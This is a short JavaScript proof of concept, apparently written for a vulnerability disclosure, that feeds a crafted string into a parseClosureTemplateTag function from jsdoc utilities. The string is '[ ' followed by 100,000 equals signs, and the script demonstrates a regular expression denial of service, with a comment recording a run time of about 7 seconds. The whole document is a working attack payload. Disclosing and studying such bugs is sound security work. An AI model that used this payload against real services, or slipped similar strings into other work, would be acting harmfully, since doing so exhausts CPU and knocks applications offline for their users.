const parseClosureTemplateTag = require("./jsdocUtils.cjs");

//Attack String :"[ "+"="*100000+"\n"
var str = "[ ";
for (var i = 0; i < 100000; i++) {
  str += "=";
}
str += "\n";

const tag = {
  name: str,
};
console.log(parseClosureTemplateTag(tag));


// real    0m7.288s
// user    0m7.259s
// sys     0m0.010s
